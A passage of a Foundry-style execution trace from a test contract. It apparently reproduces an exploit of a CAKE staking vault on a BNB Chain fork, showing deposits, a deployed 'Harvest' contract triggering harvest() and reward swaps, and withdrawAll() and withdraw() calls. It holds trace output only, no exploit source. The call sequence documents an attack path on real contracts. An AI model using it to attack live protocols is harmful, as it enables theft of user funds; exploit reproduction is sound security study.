    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [59796] 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892::deposit(50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2487] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::balanceOf(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 16645726662488623808418728 [1.664e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8269] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 814705629 [8.147e8])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 814705629 [8.147e8])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8794] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(dst: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, wad: 50004223457858899253265 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [367718] тЖТ new Harvest@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    тФВ   тФВ   тФВ   тФЬтФА [354688] 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b::harvest()
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8516] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::leaveStaking(0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3583] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::burn(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x0000000000000000000000000000000000000000, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Withdraw(user: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, pid: 0, amount: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3964] 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892::deposit(0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(dst: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, wad: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 944106011 [9.441e8]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [127595] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::swapExactTokensForTokens(944106011 [9.441e8], 0, [0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82], 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 1667770834 [1.667e9])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2494] 0x7793870484647a7278907498ec504879d6971EAb::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 4057947079 [4.057e9], 10182060187243783341 [1.018e19], 1667767795 [1.667e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2494] 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 265002163432291048497527 [2.65e23], 3730689797130688833269 [3.73e21], 1667770143 [1.667e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15866] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x7793870484647a7278907498ec504879d6971EAb, 944106011 [9.441e8])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x7793870484647a7278907498ec504879d6971EAb, value: 944106011 [9.441e8])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, value: 115792089237316195423570985008687907853269984665640564039457584007909409456099 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [45762] 0x7793870484647a7278907498ec504879d6971EAb::swap(0, 1918680398108378349 [1.918e18], 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [12862] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, 1918680398108378349 [1.918e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x7793870484647a7278907498ec504879d6971EAb, to: 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, value: 1918680398108378349 [1.918e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(0x7793870484647a7278907498ec504879d6971EAb) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5002053090 [5.002e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7793870484647a7278907498ec504879d6971EAb) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8263379789135404992 [8.263e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 5002053090 [5.002e9], reserve1: 8263379789135404992 [8.263e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount0In: 944106011 [9.441e8], amount1In: 0, amount0Out: 0, amount1Out: 1918680398108378349 [1.918e18], to: 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40929] 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6::swap(135947306623436751048 [1.359e20], 0, 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8083] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 135947306623436751048 [1.359e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 135947306623436751048 [1.359e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 264866216125667611746479 [2.648e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3732608477528797211618 [3.732e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 264866216125667611746479 [2.648e23], reserve1: 3732608477528797211618 [3.732e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount0In: 0, amount1In: 1918680398108378349 [1.918e18], amount0Out: 135947306623436751048 [1.359e20], amount1Out: 0, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [944106011 [9.441e8], 1918680398108378349 [1.918e18], 135947306623436751048 [1.359e20]]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 53922351885057717072840 [5.392e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [41768] 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F::swapExactTokensForTokens(2696117594252885853642 [2.696e21], 0, [0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 1667770834 [1.667e9])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [494] 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 264866216125667611746479 [2.648e23], 3732608477528797211618 [3.732e21], 1667770234 [1.667e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10794] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, 2696117594252885853642 [2.696e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, value: 2696117594252885853642 [2.696e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, value: 115792089237316195423570985008687907853269984665640564035919587763353094087429 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [21536] 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6::swap(0, 37537520911295605932 [3.753e19], 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 37537520911295605932 [3.753e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 37537520911295605932 [3.753e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 267562333719920497600121 [2.675e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xA527a61703D82139F8a06Bc30097cC9CAA2df5A6) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3695070956617501605686 [3.695e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 267562333719920497600121 [2.675e23], reserve1: 3695070956617501605686 [3.695e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F, amount0In: 2696117594252885853642 [2.696e21], amount1In: 0, amount0Out: 0, amount1Out: 37537520911295605932 [3.753e19], to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [2696117594252885853642 [2.696e21], 37537520911295605932 [3.753e19]]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 37537520911295605933 [3.753e19]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x453D4Ba9a2D594314DF88564248497F7D74d6b2C, 30030016729036484746 [3.003e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x453D4Ba9a2D594314DF88564248497F7D74d6b2C, value: 30030016729036484746 [3.003e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [25162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(Harvest: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7507504182259121186 [7.507e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: Harvest: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 7507504182259121186 [7.507e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 51226234290804831219198 [5.122e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2586] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x73feaa1eE314F8c655E354234017bE2193C9E24E, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [594] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::allowance(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x73feaa1eE314F8c655E354234017bE2193C9E24E) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [22486] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::approve(0x73feaa1eE314F8c655E354234017bE2193C9E24E, 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [36153] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::enterStaking(51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5994] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0x73feaa1eE314F8c655E354234017bE2193C9E24E, 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0x73feaa1eE314F8c655E354234017bE2193C9E24E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [23320] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::mint(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(user: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, pid: 0, amount: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [487] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 51226234290804831219198 [5.122e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2586] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::approve(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [594] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::allowance(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [22486] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::approve(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [11929] 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892::deposit(51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5994] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::transferFrom(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, to: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, spender: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(dst: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, wad: 51226234290804831219198 [5.122e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 63 bytes of code
    тФВ   тФВ   тФЬтФА [112403] 0x489afbAED0Ea796712c9A6d366C16CA3876D8184::withdrawAll()
    тФВ   тФВ   тФВ   тФЬтФА [2664] 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [761] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::userInfo(0, 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 136621192012506691725668 [1.366e23], 369990816627316601074721101966 [3.699e29]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000001cee3fe9ad46d85ee964
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 44955527433503234324261 [4.495e22])
    тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x489afbAED0Ea796712c9A6d366C16CA3876D8184) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФЬтФА [76008] 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b::withdraw(79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [487] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [29118] 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892::withdraw(79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [23183] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, to: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, value: 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Withdraw(param0: 0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, param1: 79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [487] 0x009cF7bC57584b7998236eff51b98A168DceA9B0::balanceOf(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 79993711372133184166803 [7.999e22]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [13730] 0x73feaa1eE314F8c655E354234017bE2193C9E24E::leaveStaking(79993711372133184166803 [7.999e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3283] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b, 79993711372133184166803 [7.999e22])
